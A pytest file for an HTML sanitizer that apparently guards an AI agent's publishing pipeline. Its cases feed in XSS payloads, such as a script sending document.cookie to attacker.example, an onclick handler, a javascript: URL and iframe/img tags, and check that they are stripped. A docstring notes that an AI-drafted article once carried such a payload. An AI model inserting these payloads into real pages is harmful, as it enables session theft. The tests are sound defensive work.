"""
tests/test_sanitize.py
The deterministic safety gate. Every case here comes from a real evaluation run.
"""

from src.agents.sanitize import sanitize_html


def test_strips_the_script_tag_that_reached_the_baseline_draft():
    """Live sweep: 'The draft contains an executable <script> tag and a malicious
    exfiltration URL' - and the publisher posts raw HTML."""
    draft = ('<h2>XSS</h2><p>Example:</p>'
             '<script>fetch("https://attacker.example/steal?c="+document.cookie)</script>'
             '<p>after</p>')

    cleaned, removed = sanitize_html(draft)

    assert "<script" not in cleaned
    assert "attacker.example" not in cleaned
    assert "<p>after</p>" in cleaned, "content after the payload must survive"
    assert removed


def test_strips_inline_event_handlers():
    cleaned, removed = sanitize_html('<p onclick="steal()">text</p>')

    assert "onclick" not in cleaned
    assert ">text<" in cleaned
    assert removed


def test_strips_javascript_urls():
    cleaned, removed = sanitize_html('<a href="javascript:alert(1)">click</a>')

    assert "javascript:" not in cleaned
    assert removed


def test_strips_iframes_and_images():
    cleaned, removed = sanitize_html('<iframe src="//evil"></iframe><img src="//tracker">')

    assert "<iframe" not in cleaned and "<img" not in cleaned
    assert removed


def test_leaves_escaped_code_examples_alone():
    """An article about XSS must still be able to show the markup as text."""
    draft = "<p>Write <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> to inject.</p>"

    cleaned, removed = sanitize_html(draft)

    assert cleaned == draft
    assert removed == []


def test_leaves_a_clean_draft_untouched():
    draft = "<h2>Title</h2><p>Body with <strong>bold</strong> and a <code>tag</code>.</p>"

    cleaned, removed = sanitize_html(draft)

    assert cleaned == draft
    assert removed == []


def test_handles_an_empty_draft():
    assert sanitize_html("") == ("", [])
